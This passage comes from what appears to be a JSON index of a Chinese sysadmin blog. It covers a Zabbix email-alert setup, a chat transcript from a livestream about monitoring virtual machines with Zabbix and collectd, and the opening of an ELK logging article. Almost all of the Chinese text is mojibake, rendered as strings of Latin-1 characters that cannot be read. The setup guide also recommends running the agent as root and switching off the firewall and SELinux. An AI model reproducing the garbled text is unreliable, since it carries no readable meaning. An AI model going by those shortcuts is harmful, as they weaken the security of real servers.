do not allow# 1 - allow## Mandatory: no# Default:AllowRoot=1 é‡å¯æœåŠ¡ï¼š 123[root@salt alertscripts]# /etc/init.d/zabbix_server restartShutting down zabbix_server: [ç¡®å®š]Starting zabbix_server: [ç¡®å®š] 3ã€æµ‹è¯•è„šæœ¬æ–‡ä»¶å‘é€é‚®ä»¶æ˜¯å¦æˆåŠŸï¼Œè¿™ä¸€æ­¥å¾ˆé‡è¦ 1./zabbix_sendmail.py cheng@health.cn \"subject\" \"zabbix\" å·²ç»æµ‹è¯•okï¼Œå¯ä»¥æ”¶åˆ°é‚®ä»¶ï¼Œè¯´æ˜å†™çš„pythonè„šæœ¬æ²¡æœ‰é—®é¢˜ã€‚ zabbix-webç«¯è®¾ç½® é¦–å…ˆwebç«¯çš„é…ç½®é¡ºåºå¦‚ä¸‹ï¼šåˆ›å»ºç”¨æˆ·åª’ä»‹â€“&gt;åˆ›å»ºç”¨æˆ·ç»„å’Œç”¨æˆ·â€“&gt;é’ˆå¯¹triggerï¼ˆè§¦å‘å™¨ï¼‰æ·»åŠ æŠ¥è­¦åŠ¨ä½œï¼Œè®¾ç½®é‚®ä»¶å‘é€ç”¨æˆ·åŠåª’ä»‹ 1.åˆ›å»ºç”¨æˆ·åª’ä»‹ åˆ›å»ºç”¨æˆ·åª’ä»‹â€“&gt;åˆ›å»ºç”¨æˆ·ç»„å’Œç”¨æˆ·â€“&gt;Media typesâ€“&gt;Createmediatype Mediatypeè®¾ç½®å¦‚ä¸‹ï¼Œ Nameé¡¹è‡ªå®šä¹‰ï¼ˆåˆ›å»ºç”¨æˆ·æ—¶ä¼šç”¨åˆ°è¿™ä¸ªåå­—),æˆ‘ä»¬ä½¿ç”¨è„šæœ¬æ¥å‘é‚®ä»¶ï¼Œæ‰€ä»¥Typeé¡¹è¯·é€‰æ‹©Scriptï¼ŒScripté¡¹åˆ™æ˜¯ä½ zabbix serverä¸Šçš„å‘é€é‚®ä»¶çš„è„šæœ¬åå­— ï¼ˆæ³¨ï¼šå¦‚è„šæœ¬åå­—æ˜¯snedmail.py,é‚£æ­¤é¡¹å°±å¡«sendmailï¼Œåç¼€ä¸è¦) zabbixä¼šä¼ ç»™è„šæœ¬ä¸‰ä¸ªå‚æ•°ï¼šæ¥æ”¶ç”¨æˆ·ï¼Œé‚®ä»¶ä¸»é¢˜ï¼Œé‚®ä»¶å†…å®¹ 2.è®¾ç½®Zabbixç”¨æˆ·æŠ¥è­¦é‚®ç®±åœ°å€ ç»„æ€-ç”¨æˆ·-Admin (Zabbix Administrator) å†åˆ°Mediaæ ‡ç­¾ä¸‹ï¼Œç‚¹å‡»Addæ·»åŠ ç”¨æˆ·åŠè¯¥ç”¨æˆ·çš„æŠ¥è­¦æ–¹å¼ï¼Œç„¶åTypeé¡¹é€‰æ‹©ä½ æ‰€åˆ›å»ºçš„é‚®ä»¶æŠ¥è­¦åå­—ï¼ˆMedia Typeï¼‰ï¼Œåœ¨Send toåå¡«å…¥ç”¨æˆ·çš„æŠ¥è­¦é‚®ç®±ï¼Œå…¶ä»–é»˜è®¤å³å¯ã€‚ 3.è®¾ç½®Zabbixè§¦å‘æŠ¥è­¦çš„åŠ¨ä½œ ç»„æ€-åŠ¨ä½œ-åˆ›å»ºåŠ¨ä½œ 123456789101112131415161718192021222324252627282930313233343536373839404142434445åç§°ï¼šAction-Emailé»˜è®¤æ¥æ”¶äººï¼šæ•…éšœ&#123;TRIGGER.STATUS&#125;,æœåŠ¡å™¨:&#123;HOSTNAME1&#125;å‘ç”Ÿ: &#123;TRIGGER.NAME&#125;æ•…éšœ!é»˜è®¤ä¿¡æ¯ï¼šå‘Šè­¦ä¸»æœº:&#123;HOSTNAME1&#125;å‘Šè­¦æ—¶é—´:&#123;EVENT.DATE&#125; &#123;EVENT.TIME&#125;å‘Šè­¦ç­‰çº§:&#123;TRIGGER.SEVERITY&#125;å‘Šè­¦ä¿¡æ¯: &#123;TRIGGER.NAME&#125;å‘Šè­¦é¡¹ç›®:&#123;TRIGGER.KEY1&#125;é—®é¢˜è¯¦æƒ…:&#123;ITEM.NAME&#125;:&#123;ITEM.VALUE&#125;å½“å‰çŠ¶æ€:&#123;TRIGGER.STATUS&#125;:&#123;ITEM.VALUE1&#125;äº‹ä»¶ID:&#123;EVENT.ID&#125;æ¢å¤ä¿¡æ¯ï¼šæ‰“é’©æ¢å¤ä¸»æ—¨ï¼šæ¢å¤&#123;TRIGGER.STATUS&#125;, æœåŠ¡å™¨:&#123;HOSTNAME1&#125;: &#123;TRIGGER.NAME&#125;å·²æ¢å¤!æ¢å¤ä¿¡æ¯ï¼šå‘Šè­¦ä¸»æœº:&#123;HOSTNAME1&#125;å‘Šè­¦æ—¶é—´:&#123;EVENT.DATE&#125; &#123;EVENT.TIME&#125;å‘Šè­¦ç­‰çº§:&#123;TRIGGER.SEVERITY&#125;å‘Šè­¦ä¿¡æ¯: &#123;TRIGGER.NAME&#125;å‘Šè­¦é¡¹ç›®:&#123;TRIGGER.KEY1&#125;é—®é¢˜è¯¦æƒ…:&#123;ITEM.NAME&#125;:&#123;ITEM.VALUE&#125;å½“å‰çŠ¶æ€:&#123;TRIGGER.STATUS&#125;:&#123;ITEM.VALUE1&#125;äº‹ä»¶ID:&#123;EVENT.ID&#125;å·²å¯ç”¨ï¼šæ‰“é’© åˆ›å»ºOperations åˆ°è¿™é‡Œå°±åŸºæœ¬é…ç½®å®Œæ¯•äº†ã€‚ æµ‹è¯•ä¸‹å…³é—­agent 1åˆ†é’Ÿå·¦å³å¯ä»¥æ”¶åˆ°é‚®ä»¶ã€‚ å…³é—­é˜²ç«å¢™å’Œselinux å³å¯ï¼Œä¸å…³é—­é˜²ç«å¢™å¼€å¯10051ç«¯å£å’Œ10050ç«¯å£ æµ‹è¯•æŸ¥çœ‹zabbixå®¡è®¡åŠ¨æ€æ—¥å¿—ï¼šå‘é€æˆåŠŸ é‚®ä»¶å·²æ¥æ”¶æˆåŠŸã€‚ å¾®ä¿¡å‘Šè­¦ä¹Ÿå·²å†™è¯¦ç»†æ–‡æ¡£ã€‚æ–‡æ¡£fileå·²ä¸Šä¼ githubä¸Šé¢äº†ã€‚ zabbix-server2.4æœåŠ¡ç«¯ç¼–è¯‘å®‰è£… zabbix-serveræœåŠ¡ç«¯ç¼–è¯‘å®‰è£… zabbix2.4ç›‘æ§80ç«¯å£çŠ¶æ€ : zabbixç›‘æ§80ç«¯å£çŠ¶æ€ zabbix+Grafanaå®‰è£…ä½¿ç”¨ç›‘æ§ç»“åˆ ï¼šzabbix+Grafanaå®‰è£…ä½¿ç”¨ç›‘æ§ç»“åˆ zabbixç›‘æ§MySQL-æ·»åŠ è‡ªå®šä¹‰ç›‘æ§é¡¹ : zabbixç›‘æ§MySQL-æ·»åŠ è‡ªå®šä¹‰ç›‘æ§é¡¹ zabbixçš„ICMP_Pingæ¨¡ç‰ˆå®ç°å¯¹å®¢æˆ·ç«¯ç½‘ç»œçŠ¶æ€çš„ç›‘æ§ : zabbixçš„ICMP_Pingæ¨¡ç‰ˆå®ç°å¯¹å®¢æˆ·ç«¯ç½‘ç»œçŠ¶æ€çš„ç›‘æ§ zabbixæ€§èƒ½ç›‘æ§æ•…éšœæ€»ç»“ zabbixæ€§èƒ½ç›‘æ§æ•…éšœæ€»ç»“","link":"/2014/10/05/æ€§èƒ½ç›‘æ§/Zabbix/zabbixé‚®ä»¶å‘Šè­¦/"},{"title":"ç›´æ’­åˆ†äº«çš„ä¸»é¢˜æ˜¯äº‘ç›‘æ§----zabbix&collectd äº’ç›¸è®¨è®º","text":"ç›´æ’­åˆ†äº«çš„ä¸»é¢˜æ˜¯äº‘ç›‘æ§â€”-zabbix&amp;collectd äº’ç›¸è®¨è®ºå‰å‡ å¤©å‚åŠ KVMå¼€å±•çš„ç›´æ’­ç§€ï¼Œè‚–æ€»è¯·æ¥äº†å„ä½è¿ç»´å¤§å’–ç»™æˆ‘ä»¬å±•ç¤ºä»–ä»¬äº‘ç›‘æ§ã€‚è¿™é‡Œæˆ‘æ•´ç†ä¸‹å´”å¹¿ç« å¤§å¸ˆçš„èŠå¤©è®°å½•å„ä½å¯ä»¥ä¸€èµ·è†å¬ä¸‹ã€‚ 12345678910111213141516171819202122232425 å´”å¹¿ç«  19:58æˆ‘ä¹‹å‰ä¸€ç›´åœ¨åšç§æœ‰äº‘ï¼Œæˆ‘ä»¬æ•´ä¸ªäº‘å¹³å°çš„ç›‘æ§ç³»ç»Ÿç³»ç»Ÿç”¨çš„å°±æ˜¯zabbix å´”å¹¿ç«  19:59åŸºæœ¬æ²¡ä»€ä¹ˆå˜åŒ–ï¼Œåšçš„æ¯”è¾ƒå¤šçš„å°±æ˜¯å›½é™…åŒ–ï¼Œå¤§å®¶éƒ½æ‡‚çš„ å´”å¹¿ç«  20:00æˆ‘å…ˆå€Ÿåº¦å¨˜ç»™æ­å»ºæ‰«ä¸ªç›² å´”å¹¿ç«  20:00zabbixï¼ˆéŸ³åŒ zÃ¦bixï¼‰æ˜¯ä¸€ä¸ªåŸºäºWEBç•Œé¢çš„æä¾›åˆ†å¸ƒå¼ç³»ç»Ÿç›‘è§†ä»¥åŠç½‘ç»œç›‘è§†åŠŸèƒ½çš„ä¼ä¸šçº§çš„å¼€æºè§£å†³æ–¹æ¡ˆã€‚ å´”å¹¿ç«  20:01zabbixèƒ½ç›‘è§†å„ç§ç½‘ç»œå‚æ•°ï¼Œä¿è¯æœåŠ¡å™¨ç³»ç»Ÿçš„å®‰å…¨è¿è¥ï¼›å¹¶æä¾›çµæ´»çš„é€šçŸ¥æœºåˆ¶ä»¥è®©ç³»ç»Ÿç®¡ç†å‘˜å¿«é€Ÿå®šä½/è§£å†³å­˜åœ¨çš„å„ç§é—®é¢˜ã€‚ å´”å¹¿ç«  20:02zabbixç”±2éƒ¨åˆ†æ„æˆï¼Œzabbix serverä¸å¯é€‰ç»„ä»¶zabbix agentã€‚ å´”å¹¿ç«  20:02zabbix serverå¯ä»¥é€šè¿‡SNMPï¼Œzabbix agentï¼Œpingï¼Œç«¯å£ç›‘è§†ç­‰æ–¹æ³•æä¾›å¯¹è¿œç¨‹æœåŠ¡å™¨/ç½‘ç»œçŠ¶æ€çš„ç›‘è§†ï¼Œæ•°æ®æ”¶é›†ç­‰åŠŸèƒ½ï¼Œå®ƒå¯ä»¥è¿è¡Œåœ¨Linuxï¼ŒSolarisï¼ŒHP-UXï¼ŒAIXï¼ŒFree BSDï¼ŒOpen BSDï¼ŒOS Xç­‰å¹³å°ä¸Šã€‚ å´”å¹¿ç«  20:02æ‰«ç›²å°±åˆ°æ­¤ä¸ºæ­¢å§ å´”å¹¿ç«  20:03æŒ‰åº¦å¨˜çš„ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å®‰è£…å•¦ï¼Œæˆ‘å°±åœ¨è¿™è€½è¯¯å¤§å®¶çš„äººé—´å•¦ å´”å¹¿ç«  20:04zabbixç›‘æ§ä¸»è¦åˆ†å››å—ï¼Œzabbix-agent,SNMP,IPMI,å’ŒJMX å´”å¹¿ç«  20:05å› ä¸ºæˆ‘ä»¬ä¸»è¦æ˜¯æ˜¯åšIaaså’ŒPassçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åªç”¨äº†å‰ä¸‰ç§åŠŸèƒ½ å´”å¹¿ç«  20:06å‰ä¸‰ç§åŠŸèƒ½åˆåˆ†ä¸ºä¸¤ç§æ–¹æ¡ˆï¼Œå°±æ˜¯è´Ÿè½½å¤§æ—¶çš„ä¸€ç§æ–¹æ¡ˆå’Œè´Ÿè½½å°æ—¶çš„æ–¹æ¡ˆ å´”å¹¿ç«  20:07 12345 å´”å¹¿ç«  20:07è¿™æ˜¯å°è´Ÿè½½æ—¶çš„æ–¹æ¡ˆ å´”å¹¿ç«  20:08æ¥ä¸‹æ¥æ˜¯å¤§è´Ÿè½½æ—¶çš„æ–¹æ¡ˆ å´”å¹¿ç«  20:08 12å´”å¹¿ç«  20:11è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªzabbixçš„æ•´ä½“æ¶æ„å¹¿ç«  20:11 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136 å´”å¹¿ç«  20:12æˆ‘ä»14å¹´æ‰å¼€å§‹å°†zabbixè¿›è¡Œåˆ†å¸ƒå¼éƒ¨ç½² å´”å¹¿ç«  20:14åœ¨äº‘ç¯å¢ƒä¸‹ï¼Œzabbixæœ‰ä¸ªç¼ºç‚¹å°±æ˜¯ï¼Œå¯¹è™šæ‹Ÿæœºçš„ç›‘æ§è¾¾æˆ‘ä»¬æ„Ÿè§‰ä¸ç†æƒ³ å´”å¹¿ç«  20:15å› ä¸ºzabbixå¯¹ä¸è™šæ‹Ÿä¸ç‰©ç†æœºè¿›è¡Œç›‘æ§é‡‡å–çš„æ˜¯åŒæ ·çš„æ–¹æ³•ï¼Œå°±æ˜¯å‘ç³»ç»Ÿä¸­æ³¨å…¥ä»£ç†zabbix-agent å´”å¹¿ç«  20:15å¯¹è¯¸å¦‚ä»£ç†æˆ‘æœ‰ä¸¤ç‚¹æ‹…å¿ƒ å´”å¹¿ç«  20:17ä¸€ã€å› ä¸ºzabbix-agentå®ƒæœ¬èº«ä¹Ÿå ç”¨äº†èµ„æºï¼Œå¯¹äºè‡ªå·±å ç”¨çš„èµ„æºå®ƒèƒ½ä¸èƒ½å‡†ç¡®ç›‘æ§ï¼Œè¿™æˆ‘è¿˜ä¸èƒ½ç¡®å®šï¼Œå¦‚æœå®ƒä¸èƒ½å¯¹è‡ªå·±å ç”¨çš„èµ„æºè¿›è¡Œå‡†ç¡®ç›‘æ§ï¼Œé‚£å°±ç­‰äºæ±¡æŸ“äº†è™šæ‹Ÿæœº å´”å¹¿ç«  20:19äºŒï¼Œzabbix-agentæ˜¯æ‰“åŒ…åœ¨äº‘ä¸»æœºçš„é•œåƒä¸­çš„ä¸€ä¸ªcronä»»åŠ¡ï¼Œè¯´ç™½ä»–å°±æ˜¯äº‘ä¸»æœºçš„ä¸€ä¸ªæ™®é€šè¿›ç¨‹ï¼Œå¦‚æœç”¨æˆ·æŠŠå®ƒç»™killäº†ï¼Œæ˜¯ä¸æ˜¯å°±ç›‘æ§ä¸åˆ°å•¦ï¼Ÿ å´”å¹¿ç«  20:21æ‰€ä»¥æˆ‘å°±æ‰¾èƒ½è¿è¡Œåœ¨åº•å±‚åˆèƒ½å¯¹è™šæ‹Ÿæœºè¿›è¡Œå‡†ç¡®æ£€æµ‹çš„å·¥å…· å´”å¹¿ç«  20:21é‚£å°±æ˜¯æ¥ä¸‹æ¥è¦è¯´çš„collectdå–½ å´”å¹¿ç«  20:21è€è§„çŸ©ï¼Œå’±ä»¬è¿˜æ¥ç€æ‰«ç›² å´”å¹¿ç«  20:21collectdæ˜¯ä¸€ä¸ªå®ˆæŠ¤(daemon)è¿›ç¨‹ï¼Œç”¨æ¥æ”¶é›†ç³»ç»Ÿæ€§èƒ½å’Œæä¾›å„ç§å­˜å‚¨æ–¹å¼æ¥å­˜å‚¨ä¸åŒå€¼çš„æœºåˆ¶ã€‚æ¯”å¦‚ä»¥RRD æ–‡ä»¶å½¢å¼ã€‚ å´”å¹¿ç«  20:29collectdç¡®å®èƒ½å¤Ÿè¿è¡Œåœ¨åº•å±‚ï¼Œå¹¶èƒ½é‡‡é›†KVMè™šæ‹Ÿæœºçš„å„é¡¹æ•°æ®ï¼Œä½†ä»–çš„å±•ç¤ºä½¿ç”¨CGPè·Ÿzabbixæ¯”å¤ªå·® å´”å¹¿ç«  20:31æˆ‘æ‰€ä»¥æˆ‘å°±è¯•ç€å°†ä¸¤è€…è¿›è¡Œä¼˜åŠ¿äº’è¡¥ å´”å¹¿ç«  20:32æˆ‘æ˜¯å°†collectdå­˜å‚¨åœ¨*.rrdä¸­çš„ç›¸å…³æ•°æ®å–å‡ºæ¥ï¼Œç„¶åå­˜å‚¨åˆ°zabbixçš„æ•°æ®åº“å½“ä¸­ï¼Œè®©zabbixè¿›è¡Œå±•ç¤º å´”å¹¿ç«  20:33å…¶å®åªæ˜¯å°†collectdé‡‡é›†çš„è™šæ‹Ÿæœºçš„å†…å­˜çš„æ•°æ®è¿›è¡Œè½¬å­˜å’Œå±•ç¤º å´”å¹¿ç«  20:36æ•´ä¸ªè¿‡ç¨‹åŒ…æ‹¬ï¼Œåˆ†æzabbixçš„æ•°æ®åº“è¡¨ä¹‹é—´çš„å…³ç³»ï¼Œç ”ç©¶æ€ä¹ˆä»collectdçš„*.rrdæ–‡ä»¶ä¸­å–æ•°æ®æ€ä¹ˆå°†å–å‡ºçš„æ•°æ®å‘æ•°æ®åº“é‡Œä¿å­˜ï¼Œè¿™æ˜¯ä¸€é¡¹å¾ˆå¤§çš„å·¥ç¨‹ å´”å¹¿ç«  20:36ä»Šå¤©å°±åˆ†äº«åˆ°è¿™å§å¥½å§ï¼Ÿ ä¾¯ç‡š@è´µå·é«˜æ–°ç¿¼äº‘ 20:37è°¢è°¢ å´”å¹¿ç«  20:37 è¢è¿›å¤|å—äº¬|äº‘åº”ç”¨+å¤§æ•°æ®+äº‘è®¡ç®— 20:37 è–›ç¾¤ 20:37å…¶å®ä½ è¯´çš„ç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œä¸æ˜¯é—®é¢˜ åŒ—æç†Š 20:37å¤§å®¶å¼€å§‹æé—®å§ è–›ç¾¤ 20:38åªè¦æ˜¯ç›‘æ§ï¼Œéƒ½éœ€è¦æ¶ˆè€—å°‘é‡èµ„æº å´”å¹¿ç«  20:38è¿™ä¸ªé—®é¢˜æˆ‘ä¹Ÿè¯·æ•™è¿‡è‚–å“¥@è–›ç¾¤ åˆ˜æµ·å®¾ 20:38é€šè¿‡libvirtä¹Ÿèƒ½è·å–è™šæ‹Ÿæœºçš„å†…å­˜ å´”å¹¿ç«  20:38å—¯å—¯ è–›ç¾¤ 20:38ä¸å±äºæ±¡æŸ“è™šæ‹Ÿæœºå“¦ å´”å¹¿ç«  20:38å—¯å—¯ è–›ç¾¤ 20:39è…¾è®¯äº‘ä¸Šçš„è™šæ‹Ÿæœºåå‡ ä¸ªagent å´”å¹¿ç«  20:39collectdå°±æ˜¯è°ƒç”¨äº†libvirt å´”å¹¿ç«  20:39@è–› å´”å¹¿ç«  20:40é”™å•¦ è¢è¿›å¤|å—äº¬|äº‘åº”ç”¨+å¤§æ•°æ®+äº‘è®¡ç®— 20:40åœ¨é€‰æ‹©ç›‘æ§å·¥å…·çš„æ—¶å€™ï¼Œæ˜¯å¦è€ƒè™‘è¿‡å…¶ä»–ç±»ä¼¼çš„å·¥å…·ï¼Œä¾‹å¦‚nagiosï¼Œåšå‡ºé€‰æ‹©çš„ä¸»è¦è€ƒè™‘æ˜¯ä»€ä¹ˆï¼Ÿ è–›ç¾¤ 20:40ç¬¬äºŒç§æ–¹å¼ï¼Œæ¶ˆè€—èµ„æºå¤šä¸ï¼Ÿ åˆ˜æµ·å®¾ 20:40é‚£collectedå°±å¹²è¿™ä¸€ä»¶äº‹å— å´”å¹¿ç«  20:40 åˆ˜æµ·å®¾ 20:40å…¶å®è™šæ‹Ÿæœºç›‘æ§å¯ä»¥ç”¨qga åˆ˜æµ·å®¾ 20:41èµ°channel è–›ç¾¤ 20:41nagiosåŠŸèƒ½æ²¡æœ‰ZBXå¼ºï¼Œæ€§èƒ½ä¹Ÿä¸åŠ å´”å¹¿ç«  20:41collectdç›®å‰æˆ‘åªè®©å®ƒå¹²äº†æ€ä¹ˆä¸€ä»¶äº‹ åˆ˜æµ·å®¾ 20:42é‚£è‡ªå·±å†™ä¸ªè„šæœ¬æ›´ç®€å•å§ å‘µå‘µ åªæ˜¯ä¸ªäººè§‚ç‚¹ å´”å¹¿ç«  20:42æˆ‘ä¹Ÿè¯•ç€å†™äº†ä¸€å¥—è„šæœ¬ åˆ˜æµ·å®¾ 20:43@è–›ç¾¤ ç§æœ‰äº‘è·‘agentè¿˜å¥½ å…¬æœ‰äº‘ ç”¨æˆ·å¾ˆåæ„Ÿ è–›ç¾¤ 20:43@è¢è¿›å¤@å—äº¬ï¼Œäº‘è®¡ç®— å…¶å®ç›‘æ§ä¸»è¦è€ƒè™‘ï¼šæ–¹ä¾¿ï¼Œæ‰©å±•æ€§å¥½(è§„æ¨¡å’ŒäºŒæ¬¡å¼€å‘)ï¼ŒåŠŸèƒ½å…¨ï¼Œ å´”å¹¿ç«  20:43ä½†æ•°æ®è¯¯å·®å¤ªå¤§ å´”å¹¿ç«  20:44å°±æ˜¯è€ƒè™‘åˆ°è¿™ä¸€ç‚¹@åˆ˜æµ·å®¾@æ–°ç½‘ åˆ˜æµ·å®¾ 20:45è™šæ‹ŸæœºåŠ ä¸Šballon è–›ç¾¤ 20:46å—¯ï¼Œæ˜¯çš„ã€‚è…¾è®¯äº‘ä¸Šè¿™ä¹ˆå¤šagentï¼Œæ˜¯ä¸çˆ½ å´”å¹¿ç«  20:46ballonè·Ÿå†…å­˜ç›‘æ§å…³ç³»ä¸å¤§@åˆ˜æµ·å®¾@æ–°ç½‘ äºæ±Ÿç£Š@å¥‡ç‚¹æ—¶ä»£ 20:47zabbixå†å¤šä¸ªé…ç½®ä¸åŒçš„vmæ—¶ï¼Œè¯·é—®æ¨¡æ¿æ˜¯åˆ†åˆ«å®šåˆ¶çš„ä¹ˆ å´”å¹¿ç«  20:48å¯¹çš„ äºæ±Ÿç£Š@å¥‡ç‚¹æ—¶ä»£ 20:48ç›‘æ§å¤šä¸ª åˆ˜æµ·å®¾ 20:49libguestfsä¹Ÿèƒ½å¹²è¿™äº‹ è¢è¿›å¤|å—äº¬|äº‘åº”ç”¨+å¤§æ•°æ®+äº‘è®¡ç®— 20:50@è–›ç¾¤ @å´”å¹¿ç«  è°¢è°¢ åˆ˜æµ·å®¾ 20:50é’äº‘çš„ç›‘æ§èµ°çš„channelåœ¨ inité‡Œè¾¹èµ·äº†ä¸ªè¿›ç¨‹ ä¸å®¹æ˜“æ€æ­» è¿˜ä¸é”™ åˆ˜æµ·å®¾ 20:51@å´”å¹¿ç«  è°¢è°¢åˆ†äº« å´”å¹¿ç«  20:51@è¢è¿›å¤@å—äº¬ï¼Œäº‘è®¡ç®— å´”å¹¿ç«  20:51 è¢è¿›å¤|å—äº¬|äº‘åº”ç”¨+å¤§æ•°æ®+äº‘è®¡ç®— 20:52@å´”å¹¿ç«  ä¸»è¦ç›‘æ§äº†å“ªäº›æŒ‡æ ‡ï¼Ÿå¦‚æœåœ¨openstackæ¶æ„ï¼Œceilometerå’Œzabbixçš„çš„å…³ç³»æ€ä¹ˆçœ‹ï¼Ÿ åˆ˜æµ© 20:52æˆ‘æ±‚é—®ä¸ªé—®é¢˜ï¼šæŠŠzabbix agentç”¨superviseèµ·ã€‚æ˜¯ä¸æ˜¯å°±ä¸ç”¨æ‹…å¿ƒè¢«æ€æ­»çš„é—®é¢˜äº†ã€‚ äºæ±Ÿç£Š@å¥‡ç‚¹æ—¶ä»£ 20:53æˆ‘åœ¨ç”¨zabbixæ—¶,é‡åˆ°ä¸€ä¸ªé—®é¢˜,ç›‘æ§ä¸»æœºç½‘å¡çš„æ—¶å€™,zabbixé»˜è®¤é‡‡ç”¨äº†auto_discoveryçš„ç­–ç•¥,ä½†æ˜¯æˆ‘å®¿ä¸»æœºä¸Šè·‘äº†å¾ˆå¤šä¸ªå®¹å™¨,å®¹å™¨çš„ç½‘ç»œè¿è¡Œæ¨¡å¼ä¸ºæ¡¥æ¥,æ­¤æ—¶zabbixå°±ä¼šè‡ªåŠ¨å»æ£€æµ‹é‚£äº›vethçš„è®¾å¤‡,è¯·é—®æˆ‘è¯¥å¦‚ä½•é…ç½®å‘¢? è¾¾åˆ°è®©zabbixåªç›‘æ§em0 æˆ–è€…eth0çš„ç½‘å¡è®¾å¤‡å‘¢ å´”å¹¿ç«  20:54ceilometerå…¶å®æ˜¯openstackè‡ªå¸¦çš„åŠŸèƒ½ï¼Œä½†æ˜¯åŠŸèƒ½å¾ˆèœ@è¢è¿›å¤@å—äº¬ï¼Œäº‘è®¡ç®— å´”å¹¿ç«  20:54@åˆ˜æµ©@360 å…¶å®æˆ‘å°±æ˜¯æ€æƒ³çš„ å¹´ç¦ç‘@å°ç‰›èµ„æœ¬ 20:57@äºæ±Ÿç£Š@å¥‡ç‚¹æ—¶ä»£ è‡ªå·±å†™è„šæœ¬ï¼Œå–ç‰©ç†åˆ«å å´”å¹¿ç«  20:58æˆ‘ä¹Ÿé‡åˆ°è¿™æ ·çš„é—®é¢˜@äºæ±Ÿç£Š@å¥‡ç‚¹æ—¶ä»£ åˆ˜æµ© 20:59@å´”å¹¿ç«  é‚£æ˜¯ä¸æ˜¯å¯ä»¥ä¸ç”¨collectedäº† å´”å¹¿ç«  21:00ç†è®ºä¸Šæ˜¯å¯ä»¥ï¼Œä½†æ•°æ®è½¬å­˜çš„æ—¶å€™ï¼Œå·¥ä½œé‡å¾ˆå¤§@åˆ˜æµ©@360 å´”å¹¿ç«  21:01éš¾ç‚¹ä¸»è¦åœ¨zabbixç«¯ï¼Œå…³ç³»é”™ç»¼å¤æ‚ è–›ç¾¤ 21:01@äºæ±Ÿç£Š@å¥‡ç‚¹æ—¶ä»£ ç”¨æ­£åˆ™è¡¨è¾¾å¼è¿‡æ»¤ è–›ç¾¤ 21:03å…¬æœ‰äº‘èµ·agentç¡®å®æ˜¯ä¸ªé—®é¢˜ å´”å¹¿ç«  21:03è¿™æ˜¯å…¬æœ‰äº‘çš„ç—›ç‚¹ è½¬è½½ï¼škvmè®ºå› å°±æ•´ç†è¿™äº›ï¼Œæƒ³è¯´ç°åœ¨ç›‘æ§ä¹Ÿè¶Šæ¥è¶Šå®Œå–„äº†ï¼Œå¯ä»¥åšåˆ°é‚®ä»¶å‘Šè­¦ï¼Œå¾®ä¿¡å‘Šè­¦ï¼Œé’‰é’‰å‘Šè­¦çŸ­ä¿¡ç”µè¯å‘Šè­¦ã€‚ ä¸‡èƒ½çš„ç›‘æ§zabbixåªè¦æœ‰keyå€¼éƒ½å¯ä»¥åšåˆ°ä»»ä½•ç›‘æ§ã€‚ ä¹Ÿè¿˜æœ‰äº›å…¬å¸å¯¹ç›‘æ§æ›´åŠ è¦æ±‚æ€§é«˜å¯ä»¥é’ˆå¯¹æ€§æŠ€æœ¯å¼€å‘ä¸€å¥—ç›‘æ§å¤§å±ï¼Œè®°å¾—åœ¨ä¹‹å‰å…¬å¸è¿ç»´CDNå°±æ˜¯æ•´ä¸ªæŠ€æœ¯å›¢é˜Ÿç ”å‘ä¸€å¥—ç›‘æ§å¤§ç›˜çš„ï¼Œä¸»è¦ç›‘æ§æµé‡çš„çŠ¶æ€æ¯ä¸ªèŠ‚ç‚¹çš„æµé‡å¸¦å®½ã€‚ æœ‰å…´è¶£ä¸€èµ·ç ”ç©¶ç›‘æ§çš„å¯ä»¥åŠ æˆ‘QQ:1165958741 æˆ–è€…åŠ å…¥ç¾¤ä¸€èµ·è®¨è®ºï¼š459096184","link":"/2016/08/21/æ€§èƒ½ç›‘æ§/Zabbix/ç›´æ’­åˆ†äº«çš„ä¸»é¢˜æ˜¯äº‘ç›‘æ§----zabbix&collectd äº’ç›¸è®¨è®º/"},{"title":"ELKæ¶æ„æ¢³ç†-ä¹‹ES2.4åŒå®ä¾‹å¹³æ»‘å‡çº§è‡³5.2.1è¸©å‘å¹¶supervisorç®¡ç†ç¬”è®°","text":"ELKæ¶æ„æ¢³ç†ï¼šå®æ—¶æ—¥å¿—åˆ†æä½œä¸ºæŒæ¡ä¸šåŠ¡æƒ…å†µã€æ•…éšœåˆ†ææ’æŸ¥çš„ä¸€ä¸ªé‡è¦æ‰‹æ®µï¼Œç›®å‰ä½¿ç”¨æœ€å¤šæœ€æˆç†Ÿçš„è«è¿‡äºELKæ–¹æ¡ˆï¼Œæ•´ä½“æ–¹æ¡ˆä¹Ÿæœ‰å„ç§æ¶æ„ç»„åˆï¼Œåƒrsyslog-&gt;ES-&gt;kibanaã€rsyslog-&gt;Redis-&gt;Logstash-&gt;ES-&gt;kibanaã€rsyslog-&gt;kafka-&gt;Logstash-&gt;ES-&gt;kibanaç­‰ç­‰ï¼Œå¤æ‚ç‚¹çš„æœ‰sparkçš„å¼•ç”¨ã€‚ æ¯ç§æ–¹æ¡ˆé€‚åˆä¸åŒçš„åº”ç”¨åœºæ™¯ï¼Œæ²¡æœ‰ä¼˜åŠ£ä¹‹åˆ†ï¼Œæˆ‘ç›®å‰ç”¨çš„æ˜¯rsyslog-&gt;kafka-&gt;Logstash-&gt;ES-&gt;kibanaå’Œrsyslog-&gt;rsyslogä¸­ç»§-&gt;kafka-&gt;Logstash-&gt;ES-&gt;kibanaæ–¹æ¡ˆï¼Œå…±5å°ESï¼ˆ12æ ¸ã€64Gã€æœºæ¢°ç›˜ï¼‰æ¯å¤©ç´¢å¼•10å¤šäº¿æ¡æ—¥å¿—ï¼ŒåŒ…å«nginxã€uwsgiã€redisã€phpå¼€å‘æ—¥å¿—ç­‰ï¼Œè¿è¡Œæ¯”è¾ƒå¥å£®ï¼Œæ¯æ¡ç´¢å¼•æ—¥å¿—ç²¾ç®€ååœ¨10ä¸ªå­—æ®µå·¦å³ï¼Œæ¯å¤©Primary 